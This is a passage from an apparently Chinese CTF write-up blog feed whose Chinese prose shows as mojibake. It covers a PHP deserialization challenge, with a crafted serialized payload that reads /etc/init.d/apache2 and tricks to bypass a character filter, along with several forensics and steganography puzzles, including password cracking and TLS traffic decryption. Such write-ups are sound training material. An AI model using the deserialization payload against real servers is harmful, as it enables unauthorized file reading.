class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¸»è¦åˆ©ç”¨<code>file_get_contents</code>æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œéœ€è¦ç»•è¿‡<code>is_valid</code>å’Œå¼±ç±»å‹åˆ¤æ–­</p>
<p>1.ååºåˆ—åŒ–æ—¶å…ˆè°ƒç”¨<code>__destruct()</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>åˆ¤æ–­opæ˜¯å¦çš„ç­‰äºâ€2â€ï¼Œè¿™é‡Œæ˜¯å¼ºç­‰äºã€‚ä¹Ÿå°±æ˜¯opå¦‚æœä¸ºâ€2â€ï¼Œåˆ™ä»¤op=â€œ1â€</p>
<p>2.è°ƒç”¨processå‡½æ•°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">        $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœop==â€1â€åˆ™æ‰§è¡Œå†™å…¥ï¼Œå¦‚æœop==â€2â€åˆ™è¯»å–<code>filename</code>æŒ‡å‘çš„æ–‡ä»¶</p>
<p>æ‰€ä»¥å¯ä»¥ç”¨op=2ï¼Œæ¥ç»•è¿‡ç¬¬ä¸€ä¸ªå¼ºç±»å‹åˆ¤æ–­å’Œç¬¬äºŒä¸ªå¼±ç±»å‹åˆ¤æ–­</p>
<p>3.æ­¤æ—¶æ„é€ å‡ºæ¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²å¦‚ä¸‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename=<span class="string">"/etc/init.d/apache2"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line">O:<span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">" * op"</span>;i:<span class="number">2</span>;s:<span class="number">11</span>:<span class="string">" * filename"</span>;s:<span class="number">19</span>:<span class="string">"/etc/init.d/apache2"</span>;s:<span class="number">10</span>:<span class="string">" * content"</span>;N;&#125; <span class="comment">//å…¶ä¸­ç©ºæ ¼ä¾¿æ˜¯\x00</span></span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯è¿™ä¸ªæ— æ³•ç»•è¿‡<code>is_valid</code>å‡½æ•°ï¼Œå› ä¸º<code>is_valid</code>å‡½æ•°æŠŠå­—ç¬¦é™åˆ¶åœ¨äº†32-125ï¼Œä½†æ˜¯\x00å­—ç¬¦çš„ASCIIç ä¸º0ã€‚</p>
<p>ä¸¤ç§ç»•æ³•ï¼š1.php7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†å±æ€§æ”¹ä¸ºpublicè¿›è¡Œç»•è¿‡</p>
<p>2.ç”¨Sæ¥ä»£æ›¿sï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹<code>\00</code>å°±ä¼šè¢«è§£ææˆ<code>%00</code>(1ä¸ªå­—ç¬¦)ï¼Œç©ºå­—èŠ‚ï¼Œä»è€Œç»•è¿‡æ£€æµ‹</p>
<p>åœ¨æ¯”èµ›æ—¶ï¼Œflagæ²¡æ”¾åœ¨var/www/htmlä¸‹é¢éœ€è¦è¯»cmdlineæˆ–è€…apache2å¯åŠ¨è„šæœ¬ï¼Œå¾—åˆ°é…ç½®æ–‡ä»¶ä½ç½®ï¼Œå‘ç°flagåœ¨web/htmlé‡Œé¢ã€‚buuä¸Šå°±æ”¾åœ¨äº†åŒä¸€ç›®å½•ä¸‹é¢ï¼Œç›¸å¯¹è·¯å¾„ç›´æ¥è¯»flag.phpå°±è¡Œäº†ã€‚</p>
<h3 id="è™šå¹»2"><a href="#è™šå¹»2" class="headerlink" title="è™šå¹»2"></a>è™šå¹»2</h3><p>è„‘æ´é¢˜ç›®ã€‚ã€‚</p>
<p>Fileä¸ºpngæ–‡ä»¶ï¼Œæ”¾å…¥Stegsolveå°†RGBä¸‰ä¸ªé€šé“çš„å›¾ç‰‡åˆ†ç¦»å‡ºæ¥</p>
<p>å°è¯•æ‹¼æ¥ä¸‰ä¸ªå›¾ç‰‡å¹¶åŠ ä¸Šå®šä½ç åå‘ç°æ‰«ä¸å‡ºæ¥ï¼Œäºæ˜¯åˆ†é€šé“å°è¯•æŒ‰è¡Œè¯»å–æ•°æ®å¹¶æ‹¼æ¥</p>
<p>äºæ˜¯ç¼–å†™è„šæœ¬ï¼ŒåŸæœ¬æ˜¯RGBå›¾åƒä¸”å¤§å°ä¸º36*12</p>
<p>åˆ©ç”¨cv2è¯»å–é€šé“ä¿¡æ¯ä¸ºBGRï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨RGBé¡ºåºè¯»å–é€šé“ä¿¡æ¯å¹¶æŒ‰è¡Œå¾ªç¯æ‹¼æ¥</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img=cv2.imread(<span class="string">'file.png'</span>)</span><br><span class="line"></span><br><span class="line">image1=np.hstack((img[:,:,<span class="number">2</span>],img[:,:,<span class="number">1</span>],img[:,:,<span class="number">0</span>])).reshape(<span class="number">36</span>,<span class="number">36</span>) <span class="comment">#RGB</span></span><br><span class="line"></span><br><span class="line">Image.fromarray(image1).save(<span class="string">'res.png'</span>)</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°ï¼š</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="5%" height="5%" data-src="/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>å‘ç°æ ¡æ­£æŠ˜çº¿ä½ç½®ä¸å¯¹</p>
<p><code>image1=np.flipud(image1)</code></p>
<p>å›¾åƒåè½¬ä¸€ä¸‹</p>
<p>å¾—åˆ°ï¼š</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="5%" height="5%" data-src="/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>å‘ç°å·¦ä¸‹å®šä½ç åäº†</p>
<p>å°†å·¦ä¸‹å®šä½ç åè½¬180åº¦</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img=cv2.imread(<span class="string">'file.png'</span>)</span><br><span class="line"></span><br><span class="line">image1=np.hstack((img[:,:,<span class="number">2</span>],img[:,:,<span class="number">1</span>],img[:,:,<span class="number">0</span>])).reshape(<span class="number">36</span>,<span class="number">36</span>)</span><br><span class="line"></span><br><span class="line">image1[<span class="number">4</span>:<span class="number">11</span>,<span class="number">3</span>:<span class="number">10</span>]=np.rot90(image1[<span class="number">4</span>:<span class="number">11</span>,<span class="number">3</span>:<span class="number">10</span>],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">image1=np.flipud(image1)</span><br><span class="line"></span><br><span class="line">Image.fromarray(image1).save(<span class="string">'res.png'</span>)</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="5%" height="5%" data-src="/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>æ”¾è¿›<a href="http://www.efittech.com/hxdec.htmlè¯»å–å‘ç°è¯»ä¸å‡ºæ¥ï¼Œé¢˜ç›®ä¸­æç¤ºæš´åŠ›ä¿®è¡¥" target="_blank" rel="noopener">http://www.efittech.com/hxdec.htmlè¯»å–å‘ç°è¯»ä¸å‡ºæ¥ï¼Œé¢˜ç›®ä¸­æç¤ºæš´åŠ›ä¿®è¡¥</a></p>
<p>äºæ˜¯å°±åœ¨å³è¾¹çš„ç©ºç™½å¤„å…ˆç”»äº†å‡ ç¬”ï¼Œå°è¯•æ‰«ä¸€ä¸‹å‘ç°å¯ä»¥æ‰«ï¼Œå¾—åˆ°flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="55%" height="55%" data-src="/2020/05/17/2020%E7%BD%91%E9%BC%8EAreUSerialz%E3%80%81%E8%99%9A%E5%B9%BB2/4.png" src="/img/loading.gif" class="lazyload"></a>]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>INSHackå¤§æ‚çƒ©</title>
    <url>/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/</url>
    <content><![CDATA[<p>ğŸ‘´åˆæ¥è€miscäº†ï¼ŒRSAã€DESä¸æƒ³ç¼–ã€LRUä¸ç€æ€¥ï¼ŒWebåšä¸åŠ¨ã€‚miscï¼Œæˆ‘èƒ¡æ±‰ä¸‰åˆå›æ¥äº†ï¼</p>
<p>ç¡é†’åˆè§‰æœ‰ã€æ— èŠï¼Œä½œä¸šä¹Ÿä¸æƒ³å†™ï¼Œå°±æ¥åˆ·åˆ·miscï¼Œçœ‹åˆ°<code>INSHack</code>è¿™å—è¿˜æŒºå¤šï¼Œæ‰“ç®—åšåšè¯•è¯•ï¼ˆä¸­é—´è¿˜å»å¿«ä¹ä¹±æ–—äº†ã€‚</p>
<p>é¦–å…ˆCtrl Fæœä¸€ä¸‹å…³é”®è¯ï¼Œå¼€å§‹åšé¢˜ï¼Œæˆ‘ä¸¢ï¼Œäº”é“ç­¾åˆ°ï¼Œè¿™åˆ†å«–å¾—ä¹Ÿå¤ªçˆ½äº†ã€‚ã€‚</p>
<p>ç™½ç»™é¢˜ç›®ä»¬ï¼š<code>[INSHack2017]insanityã€[INSHack2017]sanityã€[INSHack2018]INSanityã€[INSHack2019]INSAnityã€[INSHack2019]Sanity</code></p>
<h3 id="INSHack2018-Self-Congratulation"><a href="#INSHack2018-Self-Congratulation" class="headerlink" title="[INSHack2018]Self Congratulation"></a>[INSHack2018]Self Congratulation</h3><p>å›¾ç‰‡å·¦ä¸Šè§’æœ‰ä¸€å †é»‘ç™½å—ï¼ŒæŒ‰ç™½è‰²ä¸º0é»‘è‰²ä¸º1è½¬æˆäºŒè¿›åˆ¶ï¼Œå¾—åˆ°ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00110001001</span><br><span class="line">10010001100</span><br><span class="line">11001101000</span><br><span class="line">01101010011</span><br><span class="line">01100011011</span><br><span class="line">10011100000</span><br></pre></td></tr></table></figure></div>

<p>äºŒè¿›åˆ¶è½¬ASCIIå¾—åˆ°ï¼š12345678</p>
<h3 id="INSHack2019-gflag"><a href="#INSHack2019-gflag" class="headerlink" title="[INSHack2019]gflag"></a>[INSHack2019]gflag</h3><p>è€ƒç‚¹ï¼š3Dæ‰“å°gcodeå‘½ä»¤</p>
<p><a href="http://gcode.ws/ã€https://ncviewer.com/ï¼ˆå‚è€ƒè‡ª[Root.](https://shawroot.cc/)å¸ˆå‚…åšå®¢" target="_blank" rel="noopener">http://gcode.ws/ã€https://ncviewer.com/ï¼ˆå‚è€ƒè‡ª[Root.](https://shawroot.cc/)å¸ˆå‚…åšå®¢</a></p>
<p>æŠŠæ–‡ä»¶åç¼€æ”¹æˆ<code>.gcode</code>ï¼Œæ”¾è¿›ä¸Šé¢ä¸¤ä¸ªç½‘ç«™éƒ½å¯ä»¥å‡ºæ¥</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/1.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/2.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="INSHack2017-hiding-in-plain-sight"><a href="#INSHack2017-hiding-in-plain-sight" class="headerlink" title="[INSHack2017]hiding-in-plain-sight"></a>[INSHack2017]hiding-in-plain-sight</h3><p>foremostæå–ä¸€ä¸‹ï¼Œæ‰“å¼€å›¾ç‰‡å°±å¾—åˆ°flagäº†</p>
<h3 id="INSHack2017-10-cl0v3rf13ld-lane-signal"><a href="#INSHack2017-10-cl0v3rf13ld-lane-signal" class="headerlink" title="[INSHack2017]10-cl0v3rf13ld-lane-signal"></a>[INSHack2017]10-cl0v3rf13ld-lane-signal</h3><p>binwalkå‘ç°é‡Œé¢æœ‰å¼ pngï¼Œæå–å‡ºæ¥å‘ç°æ˜¯æ‘©æ–¯è§£ç è§„åˆ™ï¼ŒçŒœæµ‹è¿˜æœ‰æ–‡ä»¶</p>
<p>æ”¾è¿›010é‡Œé¢ï¼Œå‘ç°oggæ–‡ä»¶ï¼Œæ‰‹åŠ¨æå–å‡ºæ¥ï¼Œæ”¾è¿›auï¼Œå‘ç°æ‘©æ–¯ç”µç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.. -. ... .- -.--. -- ----- .-. ..... ...-- ..--.- .-- .---- .-.. .-.. ..--.- -. ...-- ...- ...-- .-. ..--.- ....- --. ...-- -.-.-- -.-</span><br></pre></td></tr></table></figure></div>

<p>æœ‰ç‚¹æ‡’ï¼Œä¸æƒ³ç…§ç€è¡¨ä¸€ä¸ªä¸€ä¸ªç¿»è¯‘äº†ï¼Œç›´æ¥æ‰”åˆ°ç½‘é¡µé‡Œè·‘ä¸€ä¸‹ï¼Œå‘ç°ç»“æœåƒå¥‡ç™¾æ€ªã€‚ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSA-.--.M-----R........--..--.-W.----LL..--.-N...--V...--R..--.-....-G...---.-.--K</span><br><span class="line">INSAM5R53W1LLN3V3R4G3</span><br><span class="line">INSA(M0R53_W1LL_N3V3R_4G3!K</span><br></pre></td></tr></table></figure></div>

<p>æœ€åè¿™ä¸ªçœ‹ç€è¿˜é è°±ç‚¹ï¼Œç„¶åå»ç½‘ä¸Šæ‰¾ä¸€ä¸‹ï¼Œæ‘©æ–¯è§£ç è§„åˆ™ï¼Œå‘ç°<code>-.--.</code>ä»£è¡¨<code>(</code>ä¹Ÿå¯ä»¥ç†è§£ä¸º<code>{</code>ï¼Œæ‰€ä»¥æŠŠæœ€åè¿™ä¸ªæ”¹ä¸€ä¸‹å•Šï¼Œå¾—åˆ°flagï¼š<code>INSA{M0R53_W1LL_N3V3R_4G3!}</code></p>
<h3 id="INSHack2018-42-tar-xz"><a href="#INSHack2018-42-tar-xz" class="headerlink" title="[INSHack2018]42.tar.xz"></a>[INSHack2018]42.tar.xz</h3><p>è¿™é¢˜ä¸€çœ‹å°±æ˜¯æ¶å¿ƒäººçš„å‹ç¼©åŒ…å¥—å¨ƒï¼Œè¿™æ³¢å•Šï¼Œè¿™æ³¢æ˜¯copyï¼Œctftimeä¸Šçš„è§£å‹ä»£ç æŠ„ä¸€æ‰‹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">while [ "`find . -type f -name '*.tar.xz' | wc -l`" -gt 0 ]; do find -type f -name "*.tar.xz" -exec tar xf '&#123;&#125;' \; -exec rm -- '&#123;&#125;' \;; done;</span><br></pre></td></tr></table></figure></div>

<h3 id="INSHack2018-not-so-deep"><a href="#INSHack2018-not-so-deep" class="headerlink" title="[INSHack2018] (not) so deep"></a>[INSHack2018] (not) so deep</h3><p>è€ƒç‚¹ï¼šé¢‘è°±å’Œdeepsound</p>
<p>æ”¾è¿›auï¼Œè½¬æˆé¢‘è°±å›¾ï¼Œè°ƒä¸€ä¸‹é¢‘ç‡ï¼Œå‘ç°å¦‚ä¸‹</p>
<p>ä¸‹è½½ä¸ª<a href="https://deepsound.soft112.com/" target="_blank" rel="noopener">deepsound</a>ã€åŠå…¶åˆ†ææ–‡ä»¶çš„å¯†ç <a href="https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/run/deepsound2john.py" target="_blank" rel="noopener">ç ´è§£è„šæœ¬</a></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="100%" height="100%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>æ–‡ä»¶æ”¾è¿›å»å‘ç°æœ‰å¯†ç ï¼Œç ´è§£ä¸€ä¸‹ï¼Œå¾—åˆ°å¯†ç ï¼š<code>azerty</code></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>æŠŠ<code>flag2.txt</code>å¯¼å‡ºåï¼Œå¾—åˆ°åä¸€åŠflagï¼Œæ‹¼èµ·æ¥å°±è¡Œ</p>
<h3 id="INSHack2017-remote-multimedia-controller"><a href="#INSHack2017-remote-multimedia-controller" class="headerlink" title="[INSHack2017]remote-multimedia-controller"></a>[INSHack2017]remote-multimedia-controller</h3><p>åœ¨tcp 02æµä¸­å‘ç°ä¸€æ®µbase64ï¼Œå¤šæ¬¡è§£ç ï¼Œå¾—åˆ°flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/5.png" src="/img/loading.gif" class="lazyload"></a>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/6.png" src="/img/loading.gif" class="lazyload"></a>

<p><del>å¿«ä¹LOLå»äº†ï¼Œå‰©ä¸‹çš„ä»¥åå†™ã€‚æ˜å¤©çœ‹defconæ€ä¹ˆè¯´ï¼Œä¸æ‰“çš„è¯å°±ç¼–éç¨‹ã€æ°´æ°´miscã€‚</del></p>
<p>æ‰“å®Œå›æ¥äº†ï¼Œå†å†™ä¸€é“ç¡è§‰</p>
<h3 id="INSHack2018-Spreadshit"><a href="#INSHack2018-Spreadshit" class="headerlink" title="[INSHack2018]Spreadshit"></a>[INSHack2018]Spreadshit</h3><p>æ‹¿åˆ°è¿™é¢˜ç¬¬ä¸€ååº”ï¼Œæ”¹åç¼€ï¼Œæ‰¾æ‰¾zipé‡Œæœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿</p>
<p>ç„¶åæˆ‘å°±å‘ç°äº†ä¸€å¼ ç™½è‰²çš„pngå’Œmeta.xmlï¼ˆéƒ½æ²¡å•¥å­ç”¨ï¼‰</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>ç„¶åå°±æ‹¿excelæ‰“å¼€odsæ–‡ä»¶ï¼ŒæŸ¥æ‰¾ç©ºæ ¼ï¼Œå¹¶å…¨é€‰ï¼Œç­”æ¡ˆå°±å‡ºæ¥äº†ï¼ˆçœ‹ä¸æ¸…æ¥šå°±æŠŠè¡Œé«˜è°ƒå¤§ä¸€ç‚¹ï¼‰</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/8.png" src="/img/loading.gif" class="lazyload"></a>

<p><del>ç¡è§‰å»äº†</del>ï¼Œé†’äº†è¿˜æ˜¯æœ‰ã€æ— èŠå†åˆ·ä¼šé¢˜ç›®å§ï¼Œdefconçœ‹äº†çœ‹ï¼Œæœ‰æ„æ€ä¸ä¼šåšï¼ˆç­¾åˆ°é‚£ä¸ªè§†é¢‘å¾ˆå¥½ç©ï¼Œä½†æ˜¯æ‰¾ä¸å‡ºæ¥flagï¼‰ã€‚</p>
<h3 id="INSHack2017-lets-talk"><a href="#INSHack2017-lets-talk" class="headerlink" title="[INSHack2017]lets-talk"></a>[INSHack2017]lets-talk</h3><p>telegramï¼Œæ‡‚çš„éƒ½æ‡‚ï¼Œæ˜¯ä¸ªç­¾åˆ°é¢˜</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/9.png" src="/img/loading.gif" class="lazyload"></a>

<p>æœ€åè€ƒéªŒä¿¡æ¯æ”¶é›†èƒ½åŠ›ï¼Œå»Githubä¸Šç…ç…å°±å‘ç°äº†</p>
<h3 id="INSHack2019-Passthru"><a href="#INSHack2019-Passthru" class="headerlink" title="[INSHack2019]Passthru"></a>[INSHack2019]Passthru</h3><p>è¿™ä¸ªé¢˜ä¸­ç»™å‡ºäº†clientç«¯çš„pre-master-secretï¼Œä¹Ÿå°±æ˜¯sslkey.logæ–‡ä»¶</p>
<p>æ‰€ä»¥å¯ä»¥é€šè¿‡å®ƒæ¥è§£å¯†HTTPæµé‡</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/10.png" src="/img/loading.gif" class="lazyload"></a>

<p>è§£å¯†ä¹‹åæˆ‘æƒ³å¯¼å‡ºhttpå¯¹è±¡çœ‹çœ‹éƒ½æœ‰å•¥ï¼Œå‘ç°æœ‰äº›å¤±æ•ˆçš„çš„è®¿é—®imageçš„urlï¼Œç„¶è€Œå¹¶æ²¡æœ‰çœ‹å‡ºæ¥æœ‰å•¥ç”¨ã€‚</p>
<p>å»çœ‹wpï¼Œå‘ç°è¦æ”¶é›†urlä¸­çš„kcahsniå‚æ•°ï¼ˆinshack|æš—ç¤ºä¸‹æ–‡é€†åºï¼‰ï¼Œå¹¶å°†å…¶è¿›è¡Œåå…­è¿›åˆ¶è§£ç </p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/05/15/INSHack%E5%A4%A7%E6%9D%82%E7%83%A9/11.png" src="/img/loading.gif" class="lazyload"></a>

<p>ä¿®å¤å¹¶æå–</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">editcap -r capture.pcap fixed.pcap 1-5438</span><br><span class="line">tshark -r fixed.pcap -o <span class="string">'ssl.keylog_file:sslkey.log'</span> -Y <span class="string">'http contains "GET /searchbyimage"'</span> -T fields -e http.request.uri.query.parameter &gt; queries.txt</span><br></pre></td></tr></table></figure></div>

<p>å¯¹æå–å‡ºæ¥çš„æ–‡æœ¬è¿›è¡Œ16è¿›åˆ¶è§£ç </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hexstr = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'queries.txt'</span>, <span class="string">'rt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    hexstr = <span class="string">''</span>.join([param.split(<span class="string">','</span>)[<span class="number">0</span>][<span class="number">109</span>:] <span class="keyword">for</span> param <span class="keyword">in</span> f.readlines()])</span><br><span class="line"></span><br><span class="line">out = bytes.fromhex(hexstr).decode(<span class="string">'latin1'</span>)</span><br><span class="line">print(out)</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°ï¼š</p>
<blockquote>
<p>ÂÃ·sÃ¾Â—ÃµeTÂ£Â´&amp;ÃÃ¡Ã·Ã³ÃœÃ®ÂŸÂ¯Â‰rZÂ¹9hÃ¼RÃ°&lt;<br>}e59ad3f38a01dca00f9759e6d205317642c5421fcdad034ebe7077c2bddd472b{ASNI<br>2Â•ÃƒÃl$Ã²Â¨Ã‡Ã¨Â“fgÃ›Ã·Ã¾Ã(EjÃ’JÃ‚Ã†Â¡.&gt;Ã¾K</p>
</blockquote>
<p>å¾ˆæ˜æ˜¾äº†ï¼ŒæŠŠç¬¬äºŒè¡Œé€†åºä¸€ä¸‹å°±å¯ä»¥äº†ï¼ˆrevæ˜¯é•œåƒå‘½ä»¤ï¼‰</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#125;e59ad3f38a01dca00f9759e6d205317642c5421fcdad034ebe7077c2bddd472b&#123;ASNI&quot; | rev</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°flagï¼Œè¿˜æ–°å­¦äº†trå‘½ä»¤-s -c -d â€¦..å¯¹æ–‡æœ¬å¾ˆæ–¹ä¾¿çš„æ“ä½œ</p>
<p>&nbsp;</p>
<p>åšåˆ°è¿™ï¼Œåé¢æˆ‘çœ‹å’‹ä¸€å †å¯†ç ç±»çš„é¢˜å‘¢ï¼Œå­ä¼šåšäº†ï¼Œç¼–ä½œä¸šå»äº†</p>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>Misc</tag>
